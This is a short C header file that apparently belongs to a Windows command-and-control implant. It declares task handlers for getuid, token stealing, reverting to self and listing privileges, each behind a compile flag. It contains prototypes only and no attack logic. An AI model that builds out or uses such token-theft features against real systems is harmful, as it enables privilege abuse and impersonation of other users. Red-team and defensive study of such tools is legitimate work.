#pragma once
#ifndef TOKEN_H
#define TOKEN_H

#include <windows.h>
#include "Parser.h"
#include "Config.h"

#ifdef INCLUDE_CMD_GETUID
VOID TokenGetUid(_In_ PCHAR taskUuid, _In_ PPARSER arguments);
#endif  //INCLUDE_CMD_GETUID

#ifdef INCLUDE_CMD_STEAL_TOKEN
VOID TokenSteal(_In_ PCHAR taskUuid, _In_ PPARSER arguments);
#endif  //INCLUDE_CMD_STEAL_TOKEN

#ifdef INCLUDE_CMD_REV2SELF
VOID TokenRevert(_In_ PCHAR taskUuid, _In_ PPARSER arguments);
#endif  //INCLUDE_CMD_REV2SELF

#ifdef INCLUDE_CMD_GETPRIVS
VOID TokenGetPrivs(_In_ PCHAR taskUuid, _In_ PPARSER arguments);
#endif  //INCLUDE_CMD_GETPRIVS

#endif  //TOKEN_H
